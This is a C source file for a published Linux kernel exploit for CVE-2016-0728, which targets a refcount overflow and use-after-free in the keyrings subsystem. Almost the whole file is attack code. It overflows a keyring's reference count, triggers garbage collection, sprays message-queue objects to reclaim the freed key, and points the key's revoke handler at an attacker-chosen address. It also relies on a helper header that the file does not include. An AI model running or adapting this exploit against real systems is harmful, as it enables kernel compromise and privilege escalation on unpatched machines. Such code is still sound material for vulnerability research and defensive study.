/*
# Exploit Title: Linux kernel REFCOUNT overflow/Use-After-Free in keyrings
# Date: 19/1/2016
# Exploit Author: Perception Point Team
# CVE : CVE-2016-0728
*/

/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

/* EDB-Note: More information ~ http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>

#include "libexp.h"

#define STRUCT_LEN (0xc8 - 0x30)
#define FORK_NUM 1
#define CRASH_IP 0xffffffffdeadbeef

struct key_type {
	char *name;
	size_t datalen;
	void *vet_description;
	void *preparse;
	void *free_preparse;
	void *instantiate;
	void *update;
	void *match_preparse;
	void *match_free;
	void *revoke;
	void *destroy;
};

/* info sharing variables */
void *share;
/* exploit variables */
const char *keyring_name = "exploit_keyname";
key_serial_t serial = -1;
struct key_type my_key_type;
struct {
	long mtype;
	char mtext[STRUCT_LEN];
} msg = {0x4141414141414141, {0}};

void context_setup()
{
	key_serial_t tmp_serial = -1;

	/* Set the new session keyring before we start */
	tmp_serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "another_random_keyname");
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
	if (serial < 0 || tmp_serial < 0)
		error_out("fail to create keyring");

	// config keyring so vulnerability can be triggered
	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0)
		error_out("fail to config keyring");
}

void payload_setup()
{

	// prepare key_type
	my_key_type.revoke = (void *)CRASH_IP;

	// prepare msg
	memset(msg.mtext, 'B', sizeof(msg.mtext));

	// key->uid
	*(int*)(&msg.mtext[0x38]) = 0x3e8; /* geteuid() */
	//key->perm
	*(int*)(&msg.mtext[0x40]) = 0x3f3f3f3f;
	*(int*)(&msg.mtext[0x48]) = 1 << 3;
	*(int*)(&msg.mtext[0x50]) = 0x4;

	//key->type
	*(unsigned long *)(&msg.mtext[0x58]) = (unsigned long)&my_key_type;
}

void trigger_gc()
{
	if(!clean_fork()) {
		setsid();
		key_serial_t tmp_serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "trigger_gc");
		if(keyctl(KEYCTL_REVOKE, tmp_serial) < 0) {
			error_out("fail to trigger gc");
		}
	}
}

void exploit(void)
{
	// increase refcount to trigger our inserted backdoor
	puts("Increfing...");
	for (int i = 1; i < 0x100-1-FORK_NUM; i++) {
		usleep(10000);
		if( i >= 0x100-3-FORK_NUM - 5) {
			sleep(2);
		}
		if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0)
			error_out("fail to inc refcount");
	}

	/* here we are going to increase the last references to overflow */
	for (int i=0; i<4; ++i) {
		printf("final i: %x\n", i);
		sleep(3);
		if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0)
			error_out("fail to inc the final several refcounts");
	}

	// now the key has 0 refcount
	// trigger gc and then race to overwrite the object
	puts("ready? go!");
	trigger_gc();
	usleep(20000);// wait for the object to be freed
	for(int i=0; i<10; i++) {
		msg_spray_max(&msg, sizeof(msg.mtext));
	}

	// wait for everything to stop
	puts("done!");
}

void trigger(void)
{
	/* call userspace_revoke from kernel */
	puts("caling revoke...");
	if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
		perror("keyctl_revoke");
	}
}


int main(int argc, const char *argv[])
{
	setsid();
	payload_setup();
	context_setup();
	exploit();
	trigger();
	return 0;
}
